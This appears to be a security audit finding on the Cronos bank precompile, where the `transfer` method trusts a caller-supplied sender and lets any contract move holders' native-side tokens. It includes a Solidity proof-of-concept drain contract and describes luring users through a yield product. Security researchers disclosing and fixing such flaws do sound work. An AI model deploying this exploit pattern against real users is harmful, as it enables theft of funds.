### Title
Unauthenticated Caller-Supplied `sender` in Bank Precompile `transfer` Enables Unauthorized Native Token Drain - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `BankContract.Run()` handler for the `transfer` method accepts the `sender` address directly from ABI-decoded calldata (`args[0]`) without verifying it equals `contract.Caller()`. Any EVM contract can call `bank.transfer(victimAddress, attackerAddress, amount)` and drain the victim's native Cosmos-side balance of the denom `evm/<callerContract>` — with no authorization check whatsoever.

---

### Finding Description

The bank precompile at address `0x0000000000000000000000000000000000000064` exposes a `transfer(address sender, address recipient, uint256 amount)` method. In the `TransferMethodName` branch of `Run()`:

```go
// x/cronos/keeper/precompiles/bank.go, lines 175–192
sender := args[0].(common.Address)   // ← taken from calldata, not from contract.Caller()
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // denom = "evm/<callerContract>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`from` is derived from the caller-supplied `sender` argument, not from `contract.Caller()`. There is no check that `sender == contract.Caller()`. The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module-blocked addresses.

Compare this to the `mint`/`burn` branch, where the denom is correctly bound to `contract.Caller()` and no arbitrary address is accepted as the debit source.

The `utils.go` `exec` helper used by other precompiles does enforce `caller == signers[0]`, but `BankContract.Run()` does not use that helper and performs no equivalent check.

---

### Impact Explanation

**Critical — Unauthorized transfer of CRC20/precompile-controlled assets.**

A malicious contract `M` deployed at address `0xM` can call:

```solidity
IBankModule(0x64).transfer(victimAddress, attackerAddress, victimBalance);
```

This triggers `bankKeeper.SendCoins(ctx, victim, attacker, coin{"evm/0xM", victimBalance})` on the Cosmos side. Any user who holds native-side tokens of denom `evm/0xM` (i.e., users who have called `moveToNative` or received minted tokens from contract `M`) will have their entire balance drained to the attacker without signing any transaction or granting any approval.

Because the denom is `evm/<contract.Caller()>`, the attacker must be the issuing contract — but that is trivially satisfied: the attacker deploys their own CRC20-style contract, induces users to hold its native-side tokens (e.g., by advertising a yield product), and then calls `transfer` to drain all holders at once.

This constitutes a complete, unauthorized balance transfer of CRC20/precompile-controlled assets, matching the Critical impact tier.

---

### Likelihood Explanation

The bank precompile is a globally accessible precompile at a fixed address (`0x64`). Any deployed EVM contract can call it with no permission requirement. The attack requires only: (1) deploying a contract, (2) having users hold native-side tokens of that contract's denom, and (3) calling `transfer` with victim addresses. Step 2 is achievable through normal DeFi interactions. The attacker is fully unprivileged.

---

### Recommendation

In the `TransferMethodName` branch, enforce that the caller-supplied `sender` equals the actual EVM caller:

```go
// After unpacking args:
if sender != contract.Caller() {
    return nil, errors.New("sender is not authenticated: transfer sender must be caller")
}
```

This mirrors the pattern already used in `utils.go`'s `exec` helper:

```go
// x/cronos/keeper/precompiles/utils.go, lines 46–49
caller := common.BytesToAddress(signers[0])
if caller != e.caller {
    return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", ...)
}
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
}

contract DrainAttack {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Attacker deploys this contract (address = 0xATTACKER_CONTRACT)
    // Step 2: Victims acquire native-side tokens of denom "evm/0xATTACKER_CONTRACT"
    //         (e.g., by calling bank.mint() through a legitimate-looking wrapper)
    // Step 3: Attacker calls drain() — no victim signature required
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim (caller-supplied, not validated)
        // denom  = "evm/<address(this)>" (bound to this contract)
        bank.transfer(victim, attacker, amount);
    }
}
```

On-chain execution path:
1. `DrainAttack.drain(victim, attacker, 1000)` is called by the attacker.
2. EVM calls bank precompile at `0x64` with `contract.Caller() = address(DrainAttack)`.
3. `Run()` unpacks `sender = victim` from calldata — **no check against `contract.Caller()`**.
4. `bankKeeper.SendCoins(ctx, victim, attacker, {denom:"evm/0xDrainAttack", amount:1000})` executes.
5. Victim's native balance is transferred to attacker without consent.
